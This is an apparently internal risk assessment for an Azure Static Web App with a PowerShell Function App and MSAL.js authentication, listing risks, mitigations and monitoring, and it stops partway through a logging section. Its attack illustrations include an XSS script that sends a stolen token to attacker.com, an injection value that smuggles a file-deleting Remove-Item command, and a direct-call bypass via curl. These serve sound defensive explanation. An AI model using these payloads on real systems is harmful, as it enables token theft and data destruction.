# Azure SWA + Function App: Risks and Mitigations

**Project:** ID360Model - Delegated Authentication Pattern  
**Date:** November 3, 2025  
**Purpose:** Risk assessment for production deployment and enterprise pattern adoption

---

## Executive Summary

This document identifies security, reliability, operational, and architectural risks associated with:
1. Azure Static Web Apps (SWA) platform
2. Azure Function Apps (PowerShell runtime)
3. MSAL.js client-side authentication
4. Dedicated redirect page pattern for delegated authentication

Each risk includes likelihood, impact, mitigation strategies, and monitoring recommendations.

---

## Table of Contents

1. [Platform Risks (Azure SWA)](#platform-risks-azure-swa)
2. [Backend Risks (Azure Function Apps)](#backend-risks-azure-function-apps)
3. [Authentication Risks (MSAL.js + Hybrid Auth)](#authentication-risks-msaljs--hybrid-auth)
4. [Dedicated Redirect Page Risks](#dedicated-redirect-page-risks)
5. [Integration Risks (SWA + Function App)](#integration-risks-swa--function-app)
6. [Operational Risks](#operational-risks)
7. [Compliance and Regulatory Risks](#compliance-and-regulatory-risks)
8. [Risk Matrix Summary](#risk-matrix-summary)

---

## Platform Risks (Azure SWA)

### Risk 1.1: SWA Service Availability

**Description:** Azure Static Web Apps could experience regional or global outages, making your application inaccessible.

**Likelihood:** Low  
**Impact:** High (complete service outage)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Multi-Region Deployment**
   - Deploy identical SWAs in multiple Azure regions
   - Use Azure Front Door or Traffic Manager for global load balancing
   - Implement health probes and automatic failover
   ```bash
   # Example: Deploy to multiple regions
   az staticwebapp create --name ID360Model-Primary --location westeurope
   az staticwebapp create --name ID360Model-Secondary --location northeurope
   ```

2. **SLA Monitoring**
   - Azure SWA Standard tier: 99.95% SLA
   - Monitor actual uptime vs. SLA commitments
   - Document downtime for SLA credit claims

3. **Status Monitoring**
   - Subscribe to Azure Status updates: https://status.azure.com
   - Configure alerts for service health events
   - Maintain runbook for outage response

4. **Static Fallback**
   - Host a minimal "service unavailable" page on CDN
   - Implement client-side retry logic with exponential backoff

**Monitoring:**
- Azure Monitor: Availability metrics
- Application Insights: Request success rate
- External uptime monitoring (Pingdom, StatusCake, etc.)

---

### Risk 1.2: Navigation Fallback Configuration Errors

**Description:** Misconfiguration of `navigationFallback` could break routing, expose sensitive pages, or cause authentication loops.

**Likelihood:** Medium  
**Impact:** Medium (functional degradation)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Configuration Validation**
   - Use JSON schema validation: `$schema": "https://json.schemastore.org/staticwebapp.config.json"`
   - Automated testing of all route configurations
   - PR review checklist for `staticwebapp.config.json` changes

2. **Testing Strategy**
   ```javascript
   // Test suite for navigation fallback
   describe('SWA Routing', () => {
     test('OAuth redirect page excluded from fallback', async () => {
       const response = await fetch('/redirect.html#code=test');
       expect(response.status).toBe(200);
       expect(response.headers.get('content-type')).toContain('text/html');
     });
     
     test('API routes not rewritten', async () => {
       const response = await fetch('/api/nonexistent');
       expect(response.status).toBe(404); // Not 200 with index.html
     });
     
     test('SPA routes rewritten to index', async () => {
       const response = await fetch('/users/123');
       expect(response.status).toBe(200);
       // Should serve index.html for client-side routing
     });
   });
   ```

3. **Exclude Critical Paths**
   - Always exclude: `/api/*`, `/.auth/*`, `/redirect.html`
   - Document why each exclusion exists
   - Version control all configuration changes

4. **Staging Environment Testing**
   - Test all route scenarios in staging before production
   - Automated smoke tests post-deployment
   - Rollback plan for bad configurations

**Monitoring:**
- 404 error rate (should be low)
- Unexpected 302 redirects
- Authentication loop detection (repeated `/.auth/login` calls)

---

### Risk 1.3: Content Security Policy (CSP) Violations

**Description:** Overly restrictive or misconfigured CSP could block legitimate resources (MSAL.js, Azure AD endpoints) or allow malicious scripts.

**Likelihood:** Medium  
**Impact:** High (authentication broken or XSS vulnerability)  
**Risk Score:** High

**Mitigation Strategies:**

1. **CSP Best Practices**
   ```json
   "globalHeaders": {
     "content-security-policy": "
       default-src 'self' https:;
       script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
       style-src 'self' 'unsafe-inline';
       img-src 'self' data: blob:;
       connect-src 'self' https://id360model-fa.azurewebsites.net https://login.microsoftonline.com https://login.windows.net https://graph.microsoft.com;
       frame-ancestors 'none';
       base-uri 'self';
       form-action 'self';
     "
   }
   ```

2. **Remove `unsafe-inline` and `unsafe-eval` (Production Hardening)**
   - Current implementation uses these for rapid development
   - **Production recommendation:** Implement nonces or hashes
   ```javascript
   // Use nonce for inline scripts
   <script nonce="${cspNonce}">
     // Your inline code
   </script>
   ```
   - Generate nonce per request in Function App responses
   - Update CSP to `script-src 'self' 'nonce-{generated}'`

3. **CSP Reporting**
   ```json
   "content-security-policy-report-only": "...; report-uri https://your-csp-report-endpoint",
   ```
   - Monitor violations before enforcing
   - Identify legitimate vs. malicious violations
   - Gradual rollout of stricter policies

4. **Subresource Integrity (SRI)**
   ```html
   <script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser@2.38.3/lib/msal-browser.min.js"
           integrity="sha384-..."
           crossorigin="anonymous"></script>
   ```
   - Verify CDN resources haven't been tampered with
   - Automatic SRI hash generation in build pipeline

**Monitoring:**
- CSP violation reports
- Browser console errors related to CSP
- Failed script/resource loads

**Risk if Ignored:** XSS attacks, CDN compromise, script injection

---

### Risk 1.4: SWA SKU Limitations (Free vs Standard)

**Description:** Free tier has significant limitations that could impact production use.

**Likelihood:** High (if using Free tier)  
**Impact:** Medium to High  
**Risk Score:** Medium to High

**Free Tier Limitations:**
- No custom domains with SSL
- No SLA guarantee
- Limited bandwidth (100 GB/month)
- Cannot link to Function Apps
- No staging environments
- Limited geographic distribution

**Mitigation Strategies:**

1. **Use Standard Tier for Production**
   ```bash
   az staticwebapp update --name ID360Model-SWA --sku Standard
   ```
   - Cost: ~$9/month per app
   - Benefits: SLA, custom domains, Function App linking, staging slots

2. **Free Tier Appropriate Use Cases**
   - Development/testing environments
   - Proof of concepts
   - Internal tools with <100 users
   - Documentation sites

**Monitoring:**
- Bandwidth usage alerts
- Cost monitoring (unexpected tier charges)

---

## Backend Risks (Azure Function Apps)

### Risk 2.1: PowerShell Runtime Limitations

**Description:** PowerShell Functions have different characteristics than Node.js/Python/C#, including cold start times and limited library ecosystem.

**Likelihood:** Medium  
**Impact:** Medium (performance/functionality limitations)  
**Risk Score:** Medium

**Specific Issues:**

1. **Cold Start Latency**
   - PowerShell cold starts: 3-10 seconds (vs 1-3s for Node.js)
   - Impact: First request after idle period is slow
   - User experience: Perceived as "hanging"

2. **Limited Async Support**
   - PowerShell 7.x has async, but not all cmdlets support it
   - May need synchronous calls where async would be better

3. **Module Loading Overhead**
   - Each function cold start loads all required modules
   - Large `requirements.psd1` increases cold start time

**Mitigation Strategies:**

1. **Minimize Cold Starts**
   - Use Premium Plan (no cold starts): ~$150/month
   - Implement "always on" with Consumption Plan:
     ```bash
     # Enable Always On (requires Basic or higher App Service Plan)
     az functionapp config set --name ID360Model-FA --always-on true
     ```
   - Scheduled health check every 5 minutes to keep instance warm
   ```javascript
   // Frontend keep-alive
   setInterval(() => {
     fetch('/api/health', { method: 'GET' });
   }, 4 * 60 * 1000); // Every 4 minutes
   ```

2. **Optimize Module Loading**
   ```powershell
   # requirements.psd1 - Only include what you need
   @{
       'Az.Accounts' = '2.*'  # Specific, not '3.*' or latest
       # Don't include entire Az module
   }
   ```

3. **Consider Alternative Runtimes**
   - **Node.js:** Better cold start, larger ecosystem, better async
   - **Python:** Excellent for data processing, good libraries
   - **C#:** Best performance, compiled, lowest cold start
   - **Trade-off:** PowerShell is easier for IT admins, scripting experience

4. **Caching Strategy**
   ```powershell
   # Cache expensive operations
   $script:tokenCache = @{}
   if ($script:tokenCache.ContainsKey($key) -and 
       (Get-Date) -lt $script:tokenCache[$key].Expiry) {
       return $script:tokenCache[$key].Token
   }
   ```

**Monitoring:**
- Cold start frequency and duration
- Function execution time percentiles (p50, p95, p99)
- User-reported "slow" requests

---

### Risk 2.2: Function App Authentication Bypass

**Description:** If Function App authentication is misconfigured, unauthorized requests could bypass SWA and hit the Function App directly.

**Likelihood:** Medium (if not properly configured)  
**Impact:** Critical (unauthorized data access)  
**Risk Score:** High

**Attack Scenario:**
```bash
# Attacker discovers Function App URL
curl https://id360model-fa.azurewebsites.net/api/user/sensitive@example.com

# If authLevel: "anonymous" and no additional checks, this succeeds!
```

**Mitigation Strategies:**

1. **Defense in Depth - Multiple Layers**

   **Layer 1: SWA Integration (Current)**
   - SWA injects `x-ms-auth-token` header
   - Function App is "linked" to SWA
   - **Issue:** Can still be called directly if URL is known

   **Layer 2: Function-Level Authentication**
   ```powershell
   # In every function's run.ps1
   param($Request, $TriggerMetadata)
   
   # Verify request came from SWA
   $swaToken = $Request.Headers['x-ms-auth-token']
   if (-not $swaToken) {
       # No SWA token = direct call = reject
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 401
           Body = "Unauthorized: Must access via Static Web App"
       })
       return
   }
   
   # Optional: Verify token issuer is your SWA
   $tokenPayload = [System.Text.Encoding]::UTF8.GetString(
       [Convert]::FromBase64String($swaToken.Split('.')[1])
   )
   $claims = $tokenPayload | ConvertFrom-Json
   
   $expectedIssuer = "https://happy-ocean-02b2c0403.3.azurestaticapps.net/.auth"
   if ($claims.iss -ne $expectedIssuer) {
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 403
           Body = "Forbidden: Invalid token issuer"
       })
       return
   }
   ```

   **Layer 3: Network Isolation**
   ```bash
   # Restrict Function App to only accept traffic from SWA
   az functionapp config access-restriction add \
     --name ID360Model-FA \
     --resource-group IAM-RA \
     --rule-name "AllowOnlySWA" \
     --action Allow \
     --priority 100 \
     --service-tag AzureCloud
   
   # Get SWA outbound IPs and whitelist them
   # Note: SWA doesn't have static IPs, use Service Tags or Private Endpoints
   ```

   **Layer 4: Azure Private Link (Enterprise)**
   - Function App in VNet with Private Endpoint
   - Only accessible via SWA integration
   - **Cost:** ~$7/month per Private Endpoint + VNet costs

2. **Remove Anonymous Auth Level (Alternative)**
   ```json
   // function.json
   {
     "bindings": [{
       "authLevel": "function",  // Require function key
       "type": "httpTrigger"
     }]
   }
   ```
   - Requires API key for all calls
   - SWA can pass key via configuration
   - **Trade-off:** Key management overhead

3. **Implement Rate Limiting**
   ```powershell
   # Simple rate limiting in PowerShell
   $script:rateLimitStore = @{}
   
   function Test-RateLimit {
       param($ClientId)
       
       $now = Get-Date
       $window = $now.AddMinutes(-1)
       
       if (-not $script:rateLimitStore.ContainsKey($ClientId)) {
           $script:rateLimitStore[$ClientId] = @()
       }
       
       # Remove old requests
       $script:rateLimitStore[$ClientId] = $script:rateLimitStore[$ClientId] | 
           Where-Object { $_ -gt $window }
       
       # Check limit
       if ($script:rateLimitStore[$ClientId].Count -ge 100) {
           return $false  # Rate limit exceeded
       }
       
       # Add current request
       $script:rateLimitStore[$ClientId] += $now
       return $true
   }
   ```

**Monitoring:**
- Requests without `x-ms-auth-token` header (alert on any)
- Requests from unexpected source IPs
- Unusual traffic patterns (sudden spikes)
- Failed authentication attempts

---

### Risk 2.3: Managed Identity Token Leakage

**Description:** If UAMI token is logged, exposed in error messages, or leaked via headers, it could be used to access resources.

**Likelihood:** Low (with proper coding practices)  
**Impact:** Critical (unauthorized Graph API access)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Never Log Full Tokens**
   ```powershell
   # ❌ BAD
   Write-Host "Token: $graphToken"
   
   # ✅ GOOD
   Write-Host "Token acquired (length: $($graphToken.Length))"
   ```

2. **Sanitize Error Responses**
   ```powershell
   try {
       $response = Invoke-RestMethod -Uri $uri -Headers @{
           Authorization = "Bearer $token"
       }
   } catch {
       # ❌ BAD - might include token in error
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 500
           Body = $_.Exception.Message  # Could contain full request details
       })
       
       # ✅ GOOD - generic error
       Write-Host "Error details: $_"  # Log internally only
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 500
           Body = @{
               error = "Graph API call failed"
               timestamp = (Get-Date).ToUniversalTime()
           } | ConvertTo-Json
       })
   }
   ```

3. **Remove Tokens from Response Headers**
   ```powershell
   # Current implementation returns headers for debugging
   # PRODUCTION: Remove or redact tokens
   $responseBody.headers = @{
       'x-ms-request-id' = $Request.Headers['x-ms-request-id']
       # Don't include x-graph-token or x-ms-auth-token
   }
   ```

4. **Token Lifetime Management**
   - UAMI tokens valid for 24 hours
   - Implement token caching with proper expiry
   - Refresh before expiry to avoid sudden failures

5. **Least Privilege Permissions**
   ```bash
   # Only grant permissions the UAMI actually needs
   az ad app permission add --id <app-id> \
     --api 00000003-0000-0000-c000-000000000000 \
     --api-permissions e1fe6dd8-ba31-4d61-89e7-88639da4683d=Role  # User.Read.All
   
   # Don't grant Directory.ReadWrite.All if you only need User.Read.All
   ```

**Monitoring:**
- Token appearance in logs (automated scanning)
- Unexpected Graph API calls from UAMI
- Permission scope changes on UAMI

---

### Risk 2.4: PowerShell Injection Attacks

**Description:** If user input is not properly sanitized, attackers could inject PowerShell commands.

**Likelihood:** Low (if input validation implemented)  
**Impact:** Critical (code execution, data breach)  
**Risk Score:** Medium to High

**Attack Example:**
```powershell
# Vulnerable code
$userPrincipalName = $Request.Params.userPrincipalName
$result = Invoke-Expression "Get-MgUser -UserId $userPrincipalName"  # ❌ DANGEROUS

# Attacker provides: "user@example.com; Remove-Item C:\*"
```

**Mitigation Strategies:**

1. **Never Use `Invoke-Expression` with User Input**
   ```powershell
   # ❌ NEVER DO THIS
   Invoke-Expression $userInput
   
   # ✅ Use parameterized APIs
   $graphUrl = "https://graph.microsoft.com/v1.0/users/$userPrincipalName"
   Invoke-RestMethod -Uri $graphUrl -Headers $headers
   ```

2. **Input Validation**
   ```powershell
   # Validate UPN format
   if ($userPrincipalName -notmatch '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$') {
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 400
           Body = "Invalid userPrincipalName format"
       })
       return
   }
   
   # Whitelist allowed characters
   if ($userPrincipalName -match '[;&|<>$`]') {
       Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
           StatusCode = 400
           Body = "Invalid characters in userPrincipalName"
       })
       return
   }
   ```

3. **Use Parameterized Queries**
   ```powershell
   # Safe - URI encoding handled by Invoke-RestMethod
   $encodedUpn = [System.Web.HttpUtility]::UrlEncode($userPrincipalName)
   $graphUrl = "https://graph.microsoft.com/v1.0/users/$encodedUpn"
   ```

4. **Content Security**
   - Run Function App with least privilege
   - Don't store sensitive data in function directory
   - Use managed identities instead of connection strings

**Monitoring:**
- Failed input validation (potential attack attempts)
- Unusual characters in request parameters
- Error patterns indicating injection attempts

---

## Authentication Risks (MSAL.js + Hybrid Auth)

### Risk 3.1: Token Storage in Browser

**Description:** MSAL.js stores tokens in `sessionStorage` (default) or `localStorage`, which is accessible to JavaScript and vulnerable to XSS attacks.

**Likelihood:** Medium (if XSS vulnerability exists)  
**Impact:** Critical (token theft, session hijacking)  
**Risk Score:** High

**Attack Scenario:**
```javascript
// Attacker injects malicious script via XSS
<script>
  const token = sessionStorage.getItem('msal.token.keys...');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Mitigation Strategies:**

1. **XSS Prevention (Primary Defense)**
   - Strict Content Security Policy (see Risk 1.3)
   - Input sanitization on all user-provided content
   - Use frameworks with built-in XSS protection (React, Vue, Angular)
   - **Never** use `innerHTML` with user content
   ```javascript
   // ❌ DANGEROUS
   element.innerHTML = userInput;
   
   // ✅ SAFE
   element.textContent = userInput;
   ```

2. **Session Storage vs Local Storage**
   ```javascript
   // Current configuration (✅ GOOD)
   const msalConfig = {
     cache: {
       cacheLocation: 'sessionStorage',  // Cleared when tab closes
       storeAuthStateInCookie: false
     }
   };
   
   // ❌ AVOID for sensitive apps
   cacheLocation: 'localStorage'  // Persists across sessions
   ```
   - `sessionStorage`: Tokens cleared when user closes tab
   - `localStorage`: Tokens persist indefinitely (higher risk)

3. **Short Token Lifetimes**
   - Access tokens: 1 hour (Azure AD default)
   - Refresh tokens: Can be long-lived
   - Configure token lifetime policies:
   ```powershell
   # Azure AD Conditional Access policy
   New-AzureADPolicy -Definition @('{"TokenLifetimePolicy":{"Version":1,"AccessTokenLifetime":"00:30:00"}}') `
     -DisplayName "30 Minute Access Tokens" `
     -Type "TokenLifetimePolicy"
   ```

4. **Token Binding (Advanced)**
   - Bind tokens to device/browser characteristics
   - Requires custom implementation
   - Prevents token replay on different devices

5. **Regular Security Audits**
   - Automated XSS scanning in CI/CD
   - Penetration testing of authentication flows
   - Code review focused on user input handling

**Monitoring:**
- Unusual token usage patterns (same token from multiple IPs)
- Token usage after user reports compromise
- Failed Graph API calls with expired tokens

---

### Risk 3.2: MSAL.js Library Compromise

**Description:** If the MSAL.js CDN is compromised or DNS is hijacked, malicious code could be injected into the authentication flow.

**Likelihood:** Very Low  
**Impact:** Critical (mass token theft)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Subresource Integrity (SRI)** (see Risk 1.3)
   ```html
   <script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser@2.38.3/lib/msal-browser.min.js"
           integrity="sha384-[hash]"
           crossorigin="anonymous"></script>
   ```

2. **Self-Host MSAL.js (Enterprise Option)**
   ```bash
   # Download and verify MSAL.js
   npm install @azure/msal-browser@2.38.3
   
   # Copy to your SWA
   cp node_modules/@azure/msal-browser/lib/msal-browser.min.js webapp/lib/
   
   # Update HTML
   <script src="/lib/msal-browser.min.js"></script>
   ```
   - **Benefit:** Complete control over library version
   - **Trade-off:** Manual updates, no CDN caching benefits

3. **Pin Specific Versions**
   ```html
   <!-- ❌ RISKY - always gets latest -->
   <script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser/lib/msal-browser.min.js"></script>
   
   <!-- ✅ SAFE - pinned version -->
   <script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser@2.38.3/lib/msal-browser.min.js"></script>
   ```

4. **Monitor MSAL.js Releases**
   - Subscribe to GitHub releases: https://github.com/AzureAD/microsoft-authentication-library-for-js/releases
   - Security advisories: https://github.com/AzureAD/microsoft-authentication-library-for-js/security/advisories
   - Plan regular updates (test in staging first)

**Monitoring:**
- SRI hash mismatches (browser will block and log)
- CSP violations for unexpected script sources
- User reports of unusual authentication behavior

---

### Risk 3.3: Redirect URI Hijacking

**Description:** If an attacker can register a malicious app with your redirect URI, they could intercept authorization codes.

**Likelihood:** Low (requires Azure AD tenant access or URI misconfiguration)  
**Impact:** High (token theft for compromised users)  
**Risk Score:** Medium

**Attack Scenario:**
1. Attacker creates a fake app with redirect URI: `https://happy-ocean-02b2c0403.3.azurestaticapps.net/redirect.html`
2. Tricks users into authorizing the fake app
3. Attacker receives authorization code, exchanges for token

**Mitigation Strategies:**

1. **Exact Redirect URI Matching**
   - Azure AD enforces exact URI matching (including trailing slashes)
   - Ensure your app registration only has legitimate URIs:
   ```bash
   # Audit current redirect URIs
   az ad app show --id 1ba30682-63f3-4b8f-9f8c-b477781bf3df \
     --query "spa.redirectUris"
   
   # Remove any suspicious URIs
   ```

2. **State Parameter Validation**
   - MSAL.js automatically generates and validates `state` parameter
   - Prevents CSRF attacks on redirect endpoint
   ```javascript
   // MSAL does this automatically, but for reference:
   const state = generateRandomString();
   sessionStorage.setItem('msal.state', state);
   
   // After redirect
   const returnedState = getParameterByName('state');
   if (returnedState !== sessionStorage.getItem('msal.state')) {
     throw new Error('State mismatch - possible CSRF attack');
   }
   ```

3. **PKCE (Proof Key for Code Exchange)**
   - MSAL.js v2 uses PKCE by default for SPA apps
   - Prevents authorization code interception
   - No configuration needed (automatic with SPA app registration type)

4. **Regular App Registration Audits**
   ```powershell
   # List all app registrations in tenant
   Get-AzureADApplication | Select-Object DisplayName, AppId, ReplyUrls
   
   # Alert on suspicious redirect URIs
   Get-AzureADApplication | Where-Object {
     $_.ReplyUrls -match "localhost|ngrok|127.0.0.1" -and
     $_.DisplayName -notmatch "dev|test"
   }
   ```

**Monitoring:**
- New app registrations in your tenant (alert security team)
- Changes to existing app registrations (especially redirect URIs)
- Failed state validation attempts

---

### Risk 3.4: Phishing Attacks on Authentication Flow

**Description:** Users could be tricked into entering credentials on fake login pages that mimic Azure AD.

**Likelihood:** Medium (common phishing vector)  
**Impact:** High (credential theft)  
**Risk Score:** High

**Mitigation Strategies:**

1. **User Education**
   - Train users to recognize legitimate `login.microsoftonline.com` URLs
   - Enable security indicators (green padlock, organization name)
   - Phishing simulation exercises

2. **Conditional Access Policies**
   ```powershell
   # Require MFA for all users accessing this app
   New-AzureADMSConditionalAccessPolicy -DisplayName "ID360-RequireMFA" `
     -State "Enabled" `
     -Conditions @{
       Applications = @{ IncludeApplications = "1ba30682-63f3-4b8f-9f8c-b477781bf3df" }
       Users = @{ IncludeUsers = "All" }
     } `
     -GrantControls @{
       Operator = "AND"
       BuiltInControls = @("mfa")
     }
   ```

3. **Passwordless Authentication**
   - Windows Hello for Business
   - FIDO2 security keys
   - Microsoft Authenticator app (passwordless mode)
   - Reduces phishing surface (no password to steal)

4. **Domain Verification**
   ```javascript
   // Verify we're redirecting to Microsoft's domain
   msalInstance.loginRedirect().then(() => {
     // MSAL ensures redirect goes to configured authority
     // which should be login.microsoftonline.com
   });
   
   // Log actual redirect URL for monitoring
   console.log('Redirecting to:', msalConfig.auth.authority);
   ```

**Monitoring:**
- Failed sign-in attempts (could indicate phished credentials)
- Sign-ins from unusual locations
- Azure AD Identity Protection risk detections

---

## Dedicated Redirect Page Risks

### Risk 4.1: Redirect Page Becomes Attack Target

**Description:** Since `/redirect.html` is excluded from authentication and navigation fallback, it could be a target for attacks or misconfiguration.

**Likelihood:** Low  
**Impact:** Medium (auth flow disruption)  
**Risk Score:** Low

**Mitigation Strategies:**

1. **Minimal Code Surface**
   - Keep redirect.html as simple as possible
   - Only MSAL.js + minimal handling logic
   - No user input processing
   - No business logic

2. **Configuration Protection**
   ```json
   // staticwebapp.config.json
   {
     "routes": [
       {
         "route": "/redirect.html",
         "allowedRoles": ["anonymous", "authenticated"],
         "headers": {
           "X-Frame-Options": "DENY",
           "X-Content-Type-Options": "nosniff",
           "Referrer-Policy": "strict-origin-when-cross-origin"
         }
       }
     ]
   }
   ```

3. **Rate Limiting**
   - Limit requests to `/redirect.html` to prevent abuse
   - Normal usage: 1-2 requests per user session
   - Alert on excessive calls (could indicate attack)

4. **Monitoring**
   ```javascript
   // In redirect.html, log anomalies
   if (!window.location.hash && !window.location.search) {
     console.error('Redirect page loaded without OAuth parameters');
     // Could be direct navigation (suspicious) or URL stripping
   }
   ```

**Monitoring:**
- Direct GET requests to `/redirect.html` (without referrer from Azure AD)
- Failed token exchanges on redirect page
- Excessive calls to redirect page

---

### Risk 4.2: sessionStorage Race Conditions

**Description:** Token stored in sessionStorage by redirect.html might not be available when main page loads (timing issues, browser differences).

**Likelihood:** Low (but browser-dependent)  
**Impact:** Medium (user sees "no token" briefly, needs to click button again)  
**Risk Score:** Low

**Mitigation Strategies:**

1. **Retry Logic**
   ```javascript
   // In index.html
   function checkForTokenFromRedirect(retries = 3, delay = 100) {
     const token = sessionStorage.getItem('msalGraphToken');
     if (token) {
       graphToken = token;
       sessionStorage.removeItem('msalGraphToken');
       updateTokenStatus();
       return true;
     }
     
     if (retries > 0) {
       setTimeout(() => {
         checkForTokenFromRedirect(retries - 1, delay * 2);
       }, delay);
     }
     return false;
   }
   ```

2. **Explicit Redirect Delay**
   ```javascript
   // In redirect.html
   sessionStorage.setItem('msalGraphToken', response.accessToken);
   
   // Small delay to ensure storage is committed
   setTimeout(() => {
     window.location.href = '/';
   }, 100);
   ```

3. **Fallback to MSAL Cache**
   - MSAL.js also stores tokens in its own cache
   - If sessionStorage transfer fails, MSAL can attempt silent refresh
   ```javascript
   const accounts = msalInstance.getAllAccounts();
   if (accounts.length > 0 && !graphToken) {
     // Try silent acquisition
     const response = await msalInstance.acquireTokenSilent({
       scopes: ['User.Read'],
       account: accounts[0]
     });
     graphToken = response.accessToken;
   }
   ```

**Monitoring:**
- "Token not found" errors after redirect
- Multiple token acquisition attempts in short time
- Browser-specific failure patterns

---

## Integration Risks (SWA + Function App)

### Risk 5.1: SWA-Function App Link Failure

**Description:** If the link between SWA and Function App breaks, authentication headers won't be passed, breaking delegated auth.

**Likelihood:** Low (stable once configured)  
**Impact:** High (loss of authentication context)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Infrastructure as Code (IaC)**
   ```bash
   # Document and version control the link
   az staticwebapp backends link \
     --name ID360Model-SWA \
     --resource-group IAM-RA \
     --backend-resource-id $(az functionapp show --name ID360Model-FA --resource-group IAM-RA --query id -o tsv) \
     --backend-region westeurope
   ```

2. **Health Checks**
   ```javascript
   // Regular health check verifies link is working
   async function verifyIntegration() {
     const response = await fetch('/api/health');
     const data = await response.json();
     
     // Check if SWA headers are present
     if (!data.headers['x-ms-auth-token']) {
       console.error('SWA integration broken - no auth token header');
       alertOps('SWA-FA link may be broken');
     }
   }
   ```

3. **Deployment Testing**
   - After any infrastructure change, test auth flow
   - Automated smoke test: "Can authenticated user call /api/user/me?"
   - Rollback plan if integration breaks

4. **Monitoring**
   ```bash
   # Verify link status
   az staticwebapp backends show \
     --name ID360Model-SWA \
     --resource-group IAM-RA
   ```

**Monitoring:**
- Missing `x-ms-auth-token` headers in Function App logs
- Increase in 401/403 errors after infrastructure changes
- Health check failures

---

### Risk 5.2: CORS Misconfiguration

**Description:** Incorrect CORS settings could allow unauthorized origins to call your API or block legitimate requests.

**Likelihood:** Medium (common misconfiguration)  
**Impact:** Medium (security hole or broken functionality)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Specific Origins (Not Wildcards)**
   ```bash
   # ❌ INSECURE - Allows any origin
   az functionapp cors add --name ID360Model-FA --allowed-origins "*"
   
   # ✅ SECURE - Only your SWA
   az functionapp cors add --name ID360Model-FA \
     --allowed-origins "https://happy-ocean-02b2c0403.3.azurestaticapps.net"
   ```

2. **Multiple Environments**
   ```bash
   # Production
   az functionapp cors add --allowed-origins "https://id360.newday.co.uk"
   
   # Staging
   az functionapp cors add --allowed-origins "https://staging-id360.newday.co.uk"
   
   # Development
   az functionapp cors add --allowed-origins "http://localhost:4280"
   ```

3. **CORS Preflight Optimization**
   ```bash
   # Cache preflight requests for 1 hour
   az functionapp config appsettings set \
     --name ID360Model-FA \
     --settings "CORS_PREFLIGHT_MAX_AGE=3600"
   ```

4. **Validate Origin in Function Code**
   ```powershell
   # Defense in depth - verify origin even with CORS
   $origin = $Request.Headers['origin']
   $allowedOrigins = @(
     'https://happy-ocean-02b2c0403.3.azurestaticapps.net',
     'https://id360.newday.co.uk'
   )
   
   if ($origin -and $origin -notin $allowedOrigins) {
     Write-Host "Rejected request from unauthorized origin: $origin"
     Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
       StatusCode = 403
       Body = "Forbidden origin"
     })
     return
   }
   ```

**Monitoring:**
- CORS-related errors in browser console
- OPTIONS requests (preflight) failure rate
- Requests from unexpected origins

---

## Operational Risks

### Risk 6.1: Deployment Pipeline Failure

**Description:** GitHub Actions workflow could fail, preventing updates to SWA or Function App.

**Likelihood:** Medium  
**Impact:** Medium (cannot deploy updates/fixes)  
**Risk Score:** Medium

**Mitigation Strategies:**

1. **Multiple Deployment Methods**
   - Primary: GitHub Actions
   - Backup: Azure CLI manual deployment
   - Emergency: Azure Portal deployment (SWA deployment token)

2. **Rollback Capability**
   ```bash
   # SWA rollback to previous deployment
   az staticwebapp deployment list --name ID360Model-SWA
   az staticwebapp deployment show --name ID360Model-SWA --deployment-id <id>
   
   # Function App rollback (deployment slots)
   az functionapp deployment slot swap \
     --name ID360Model-FA \
     --resource-group IAM-RA \
     --slot staging
   ```

3. **Deployment Validation**
   ```yaml
   # In GitHub Actions workflow
   - name: Smoke Test
     run: |
       response=$(curl -s -o /dev/null -w "%{http_code}" https://happy-ocean-02b2c0403.3.azurestaticapps.net/)
       if [ $response -ne 200 ]; then
         echo "Deployment validation failed"
         exit 1
       fi
   ```

4. **Secret Management**
   - Store deployment tokens in GitHub Secrets
   - Rotate secrets regularly
   - Monitor for secret exposure

**Monitoring:**
- GitHub Actions workflow failures
- Deployment duration (alert if >10 minutes)
- Failed deployments per day

---

### Risk 6.2: Cost Overruns

**Description:** Unexpected usage spikes or misconfiguration could lead to unexpectedly high Azure bills.

**Likelihood:** Low to Medium  
**Impact:** Medium (budget overruns)  
**Risk Score:** Low to Medium

**Current Costs (Estimated):**
- SWA Standard: $9/month
- Function App (Consumption): $0.20/million executions + $0.000016/GB-s
- Storage (for Function App): $0.02/GB/month
- Bandwidth: First 100 GB free, then $0.05/GB

**Total typical monthly cost:** $15-30/month per environment

**Mitigation Strategies:**

1. **Cost Alerts**
   ```bash
   # Create budget alert
   az consumption budget create \
     --budget-name "ID360Model-Budget" \
     --amount 100 \
     --time-grain Monthly \
     --start-date 2025-11-01 \
     --end-date 2026-11-01 \
     --resource-group IAM-RA \
     --threshold 80 \
     --notification-email your-email@newday.co.uk
   ```

2. **Usage Quotas**
   - Set maximum daily budget for Function App
   - Implement request throttling (max X requests per user per minute)
   - Monitor and alert on unusual spikes

3. **Right-Sizing**
   - Use Consumption plan for variable load (current)
   - Consider Premium plan only if cold starts become issue
   - Review monthly usage reports

4. **Cost Optimization**
   - Optimize function execution time (faster = cheaper)
   - Cache expensive operations
   - Use efficient PowerShell cmdlets

**Monitoring:**
- Daily cost trends
- Cost per function execution
- Bandwidth usage

---

### Risk 6.3: Insufficient Logging and Monitoring

**Description:** Without proper logging, security incidents, performance issues, or errors could go unnoticed.

**Likelihood:** High (if not explicitly implemented)  
